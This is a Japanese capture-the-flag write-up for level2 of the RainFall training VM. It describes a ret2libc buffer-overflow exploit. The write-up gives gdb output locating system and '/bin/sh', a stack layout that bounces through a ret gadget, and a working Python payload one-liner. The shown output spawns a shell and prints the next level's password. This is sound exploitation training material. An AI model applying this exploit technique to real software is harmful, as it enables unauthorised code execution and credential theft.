# level2

## 方針

今回はshを呼んでる関数がないため、自分で呼び出す必要がある。
if ((unaff_retaddr & 0xb0000000) == 0xb0000000)という条件があり、
リターンアドレスの上位ビットを0xb以外にして突破しshを呼び出す.
ret2libc攻撃をする.
### systemのアドレスと"/bin/sh"のアドレスを調べる
動的リンクだから実行が必要
```
(gdb) b main
Breakpoint 1 at 0x8048542
(gdb) run
Starting program: /home/user/level2/level2

Breakpoint 1, 0x08048542 in main ()
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
(gdb) find __libc_start_main,+99999999,"/bin/sh"
0xb7f8cc58
```
### ans
pのアドレスを確認すると0x0804853e <+106>: retがわかる。
これを利用して、pのリターンアドレスを追加で１回挟むことでsystemへアクセスする。

下記のようなスタックにする
```
0xb7f8cc58 // /bin/sh のアドレス　systemの引数
4byte      // system関数のリターンアドレス なんでもいい
0xb7e6b060 // system関数のアドレス
0x0804853e // pのret命令
offset 80 byte //リターンアドレスまでのoffset　なんでもいい
```

```
(python -c "import sys; sys.stdout.write('A' * 80 + '\x3e\x85\x04\x08' + '\x60\xb0\xe6\xb7' + 'BBBB' + '\x58\xcc\xf8\xb7')" ; cat) | ./level2


level2@RainFall:~$ (python -c "import sys; sys.stdout.write('A' * 80 + '\x3e\x85\x04\x08' + '\x60\xb0\xe6\xb7' + 'BBBB' + '\x58\xcc\xf8\xb7')" ; cat) | ./level2
echo a
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>AAAAAAAAAAAA>`��BBBBX���echo a
cd /home/user/level3
cat .pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```

## memo
32bitの引数はレジスタじゃなくてスタックで渡す
シェルコード使用shを起動することもできるけど、gdbで正確な変数のアドレスを求めるのは難しいから今回は使わない。数百バイトずれちゃうから